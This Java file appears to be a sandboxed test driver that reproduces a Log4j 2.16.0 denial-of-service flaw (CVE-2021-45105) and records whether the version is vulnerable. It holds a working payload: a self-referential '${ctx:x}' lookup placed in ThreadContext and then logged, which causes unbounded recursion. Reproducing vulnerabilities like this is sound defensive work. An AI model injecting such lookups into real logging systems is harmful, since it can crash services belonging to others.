package demo.tegron;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.ThreadContext;

/**
 * Case B reproducer driver — uncontrolled-recursion DoS (CVE-2021-45105).
 *
 * 2.16.0 closed the JNDI RCE class but StrSubstitutor still recurses without
 * bound when a lookup resolves to a string that itself contains a lookup
 * referencing the same key. A self-referential Context/Map value
 * (${ctx:x} where ctx:x == "${ctx:x}...") drives unbounded recursion ->
 * StackOverflowError / CPU exhaustion.
 *
 * EFFECT-ONLY (RFC 0003 / RFC 0001 inv. 8): the observable is a DoS canary
 * (a StackOverflowError, or a watchdog timeout from CPU/stack exhaustion). NO
 * code is executed. We catch StackOverflowError and emit a sentinel line so the
 * sandbox can record the DoS side-effect deterministically; if recursion instead
 * pegs the CPU, the sandbox watchdog times the process out -- both are the canary.
 */
public final class CaseBDriver {

    private static final Logger LOG = LogManager.getLogger(CaseBDriver.class);

    public static void main(String[] args) {
        // Self-referential lookup: resolving ${ctx:x} yields a string that again
        // contains a lookup, so the substitutor recurses on itself.
        ThreadContext.put("x", "${ctx:x}Y${ctx:x}");

        System.out.println("[caseB] emitting self-referential ${ctx:x} lookup (effect-only DoS canary)");

        try {
            // On 2.16.0 this recurses without bound; on 2.17.0 recursion is
            // depth-bounded and the event logs normally (canary does not trip).
            LOG.error("recursion probe: ${ctx:x}");
            System.out.println("[caseB] CANARY_CLEAR: lookup resolved without unbounded recursion");
        } catch (StackOverflowError e) {
            // The DoS canary tripped: unbounded recursion exhausted the stack.
            System.out.println("[caseB] CANARY_TRIPPED: StackOverflowError from unbounded lookup recursion (DoS)");
            // Non-zero exit so the sandbox records the failure side-effect.
            Runtime.getRuntime().halt(42);
        } finally {
            ThreadContext.clearAll();
        }
        System.out.println("[caseB] done");
    }
}
